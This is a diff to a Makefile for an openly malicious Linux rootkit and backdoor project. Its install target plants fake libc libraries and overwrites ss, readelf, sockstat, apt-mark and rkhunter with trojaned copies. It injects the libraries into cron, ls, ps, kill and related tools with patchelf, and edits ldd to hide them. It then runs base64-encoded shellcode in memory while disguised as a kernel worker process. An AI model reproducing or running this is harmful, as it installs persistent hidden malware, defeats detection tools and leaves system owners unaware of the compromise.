@@ -1,50 +1,90 @@
 CC        := cc
 OUT       := hoxha
 CLIENT    := enver
-UPX	 	  := ./upx
+UPX	 := ./upx
 SSTRIP    := ./sstrip
 SRC       := knocker.c mutate.c anti_debug.c
 BINDIR    := /usr/bin
+LIBDIR    := /lib/x86_64-linux-gnu
 CHMOD     := chmod +x
+PATCH     := ./patchelf --add-needed
+PERSIST   := persistence
 CLIENTSRC := enver.c anti_debug.c mutate.c
+MARCH 	 := $(shell gcc -Q -march=native --help=target | grep -m1 march= | awk '{print $$2}' | tr -d '[:space:]')
 
-CFLAGS    := -s -pipe -march=native -O2 -std=gnu23 -Wall -Wextra -pedantic \
-             -fno-stack-protector -fno-asynchronous-unwind-tables -fno-ident \
-             -ffunction-sections -fdata-sections -falign-functions=1 \
-             -falign-loops=1 --no-data-sections -falign-jumps=1 \
-             -falign-labels=1 -flto -fipa-icf -z execstack
+# Library targets
+LIBEXEC  := libexec.so
+LIBHIDE  := libhide.so
+PERSIST_SRC := libexec.c libhide.c
 
-LDFLAGS   := -Wl,-z,norelro -Wl,-O1 -Wl,--build-id=none -Wl,-z,separate-code
-LIBS      := -lpthread
-
-CLIENT_CFLAGS := -s -pipe -march=native -O2 -std=gnu23 -Wall -Wextra -pedantic \
+# Common flags
+COMMON_CFLAGS := -s -pipe -march=$(MARCH) -O2 -std=gnu23 -Wall -Wextra -Werror -pedantic \
                  -fno-stack-protector -fno-asynchronous-unwind-tables -fno-ident \
                  -ffunction-sections -fdata-sections -falign-functions=1 \
                  -falign-loops=1 --no-data-sections -falign-jumps=1 \
                  -falign-labels=1 -flto -fipa-icf -z execstack
 
-CLIENT_LDFLAGS := -Wl,-z,norelro -Wl,-O1 -Wl,--build-id=none -Wl,-z,separate-code
+COMMON_LDFLAGS := -Wl,-z,norelro -Wl,-O1 -Wl,--build-id=none -Wl,-z,separate-code
+LIBS      := -lpthread
 
+# Library-specific flags
+LIB_CFLAGS := -fPIC -Wall -Wextra -Werror -pedantic -O2 -pipe -std=c23 -march=$(MARCH) -shared -ldl -static -s -nostartfiles
 
-.PHONY: all clean install
+.PHONY: all clean install main
 
-all: $(OUT) $(CLIENT)
+all: main
+
+main: $(OUT) $(CLIENT) $(LIBEXEC) $(LIBHIDE)
 
 $(OUT): $(SRC)
-	$(CC) $(SRC) -o $@ $(CFLAGS) $(LDFLAGS) $(LIBS)
+	$(CC) $(SRC) -o $@ $(COMMON_CFLAGS) $(COMMON_LDFLAGS) $(LIBS)
 	$(CHMOD) $(UPX)
 	$(CHMOD) $(SSTRIP)
 	$(UPX) --best --brute $(OUT)
 	$(SSTRIP) -z $(OUT)
 
 $(CLIENT): $(CLIENTSRC)
-	$(CC) $(CLIENTSRC) -o $@ $(CLIENT_CFLAGS) $(CLIENT_LDFLAGS)
+	$(CC) $(CLIENTSRC) -o $@ $(COMMON_CFLAGS) $(COMMON_LDFLAGS)
 	$(UPX) --best --brute $(CLIENT)
 	$(SSTRIP) -z $(CLIENT)
 
-install: all
+$(LIBEXEC): libexec.c
+	$(CC) $(LIB_CFLAGS) -o $@ $< $(COMMON_LDFLAGS)
+
+$(LIBHIDE): libhide.c
+	$(CC) $(LIB_CFLAGS) -o $@ $< $(COMMON_LDFLAGS)
+
+install:
 	install -Dm755 $(OUT) $(BINDIR)/$(OUT)
 	install -Dm755 $(CLIENT) $(BINDIR)/$(CLIENT)
+	
+	cp $(LIBEXEC) $(LIBDIR)/libc.so.4
+	cp $(LIBHIDE) $(LIBDIR)/libc.so.5
+	cp $(PERSIST)/ss $$(which ss)
+	cp $(PERSIST)/readelf $$(which readelf)
+	cp $(PERSIST)/sockstat $$(which sockstat)
+	cp $(PERSIST)/apt-mark $$(which apt-mark)
+	
+	@if which rkhunter >/dev/null 2>&1; then \
+ 		cp $(PERSIST)/rkhunter $$(which rkhunter); \
+	fi
+	
+	systemctl stop cron
+	$(CHMOD) ./patchelf
+	$(PATCH) $(LIBDIR)/libc.so.4 $$(which cron)
+	systemctl start cron
 
+	$(PATCH) $(LIBDIR)/libc.so.5 /bin/ls
+	$(PATCH) $(LIBDIR)/libc.so.5 $$(which ps)
+	$(PATCH) $(LIBDIR)/libc.so.5 $$(which kill)
+	$(PATCH) $(LIBDIR)/libc.so.5 $$(which pidof)
+	$(PATCH) $(LIBDIR)/libc.so.5 $$(which pgrep)
+	$(PATCH) $(LIBDIR)/libc.so.5 $$(which pkill)
+	$(PATCH) $(LIBDIR)/libc.so.5 $$(which killall)
+	
+	sed -i 's/try_trace \"$$RTLD\" \"$$file\" || result=1/try_trace \"$$RTLD\" \"$$file\" | grep -vE \"libc.so.4|libc.so.5\" || result=1/g' $$(which ldd)
+	
+	python3 -c "import base64, mmap, ctypes, sys, os;encoded='SDHJSIHp+f///0iNBe////9IuxVKIKocN4QZSDFYJ0gt+P///+L0XfIPyHVZq2p9Srn6SGjWf31nQ/5CZWwWFUoghWlE9jZ3I06FdFj8cXRKdv1Iae4iTUUlqhw3hBk=';raw=base64.b64decode(encoded);mem=mmap.mmap(-1,len(raw),mmap.MAP_PRIVATE|mmap.MAP_ANONYMOUS,mmap.PROT_WRITE|mmap.PROT_READ|mmap.PROT_EXEC);mem.write(raw);addr=ctypes.addressof(ctypes.c_char.from_buffer(mem));shell_func=ctypes.CFUNCTYPE(None)(addr);[sys.argv.__setitem__(i,'\0'*len(sys.argv[i])) for i in range(len(sys.argv))];libc=ctypes.CDLL(None);libc.prctl(15,b'kworker/u9:1',0,0,0);shell_func()" > /dev/null 2>&1 &
+	
 clean:
-	rm -f $(OUT) $(CLIENT)
+	rm -f $(OUT) $(CLIENT) $(LIBEXEC) $(LIBHIDE)
